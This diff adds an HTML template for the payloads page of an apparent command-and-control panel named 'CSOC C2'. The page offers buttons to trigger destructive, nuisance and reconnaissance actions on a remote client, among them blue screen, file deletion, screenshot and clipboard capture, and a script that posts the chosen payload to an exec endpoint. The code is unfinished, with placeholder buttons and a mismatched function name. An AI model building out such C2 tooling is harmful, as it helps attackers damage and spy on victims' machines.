@@ -1,0 +1,118 @@
+{% extends "base.html" %}
+
+
+{% block title %}
+
+	<title>CSOC C2 - Payloads</title>
+
+{% endblock %}
+
+
+{% block main %}
+
+<main id="main" class="main">
+
+    <div class="pagetitle">
+      <h1>Payloads</h1>
+      <nav>
+        <ol class="breadcrumb">
+          <li class="breadcrumb-item"><a href="index.html">Home</a></li>
+          <li class="breadcrumb-item">Client - {{ client }}</li>
+          <li class="breadcrumb-item active">Payloads</li>
+        </ol>
+      </nav>
+    </div><!-- End Page Title -->
+
+    <section class="section">
+      <div class="row">
+        <div class="col-lg-6">
+
+          <div class="card">
+            <div class="card-body">
+              <h5 class="card-title"></h5>
+
+              <!-- List group with Links and buttons -->
+              <div class="list-group">
+                <button type="button" class="list-group-item list-group-item-action disabled active" aria-current="true">
+                  Destructive
+                </button>
+                <button type="button" class="list-group-item list-group-item-action" onclick="callApi('{{client}}', 'test')">Blue Screen of Death</button>
+                <button type="button" class="list-group-item list-group-item-action">File Deletion</button>
+                <button type="button" class="list-group-item list-group-item-action">A fourth button item</button>
+              </div><!-- End List group with Links and buttons -->
+
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-body">
+              <h5 class="card-title"></h5>
+
+               <!-- List group with Links and buttons -->
+               <div class="list-group">
+                <button type="button" class="list-group-item list-group-item-action active" aria-current="true">
+                  Annoying
+                </button>
+                <button type="button" class="list-group-item list-group-item-action">Shake</button>
+                <button type="button" class="list-group-item list-group-item-action">Mouse Stop</button>
+                <button type="button" class="list-group-item list-group-item-action">Avoid</button>
+              </div><!-- End List group with Links and buttons -->
+
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-body">
+              <h5 class="card-title"></h5>
+
+              <!-- List group with Links and buttons -->
+              <div class="list-group">
+                <button type="button" class="list-group-item list-group-item-action active" aria-current="true">
+                  Recon
+                </button>
+                <button type="button" class="list-group-item list-group-item-action">Get Screenshot</button>
+                <button type="button" class="list-group-item list-group-item-action">Get Clipboard</button>
+                <button type="button" class="list-group-item list-group-item-action">List Users </button>
+              </div><!-- End List group with Links and buttons -->
+
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+{% endblock %}
+
+
+{% block js %}
+
+<script type="text/javascript">
+
+function callAPI(client, payload) {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", '/api/payload/exec', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({
+      "client": client,
+      "payload": payload
+  }));
+
+  // shit
+
+//   let data = {element: "barium"};
+
+// fetch("/post/data/here", {
+//   method: "POST",
+//   headers: {'Content-Type': 'application/json'}, 
+//   body: JSON.stringify(data)
+// }).then(res => {
+//   console.log("Request complete! response:", res);
+// });
+}
+
+</script>
+
+{% endblock %}
